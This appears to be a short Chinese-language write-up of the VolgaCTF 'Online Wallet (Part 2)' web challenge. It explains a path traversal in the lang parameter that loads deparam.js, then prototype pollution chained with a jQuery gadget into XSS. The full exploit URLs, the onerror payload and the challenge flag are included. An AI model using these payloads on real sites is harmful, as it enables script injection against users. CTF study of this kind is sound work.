# Online Wallet (Part 2)

`lang` 會影響引用的 js file:

`https://wallet.volgactf-task.ru/wallet?lang=meow/../a`

=>

`<script src="https://volgactf-wallet.s3-us-west-1.amazonaws.com/locale_meow/../a.js"></script>`


題目 s3 bucket 可以 list 檔案，可以看到底下有

https://volgactf-wallet.s3-us-west-1.amazonaws.com/deparam.js

追了一下，發現 jquery-bbq 用到的東西:

https://github.com/cowboy/jquery-bbq/blob/master/jquery.ba-bbq.js#L466

接著發現 prototype pollution:

`https://wallet.volgactf-task.ru/wallet?lang=/../deparam&a=c&a[__proto__][__proto__][test]=test`

根據這裡的 gadget: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md

可以尻出 XSS:

`https://wallet.volgactf-task.ru/wallet?lang=/../deparam&a=c&a[__proto__][__proto__][div][0]=1&a[__proto__][__proto__][div][1]=%3Cimg/src/onerror%3dalert(1)%3E&a[__proto__][__proto__][div][2]=1`

但必須將滑鼠移到 Deposit 才會觸發

很容易想到用 `#deposidButton` 來讓他 focus 上去，但太快 focus 也不會觸發，要停個一秒之類的 XD

`VolgaCTF{6c1525cf575f725ceab8823702eaabd8}`
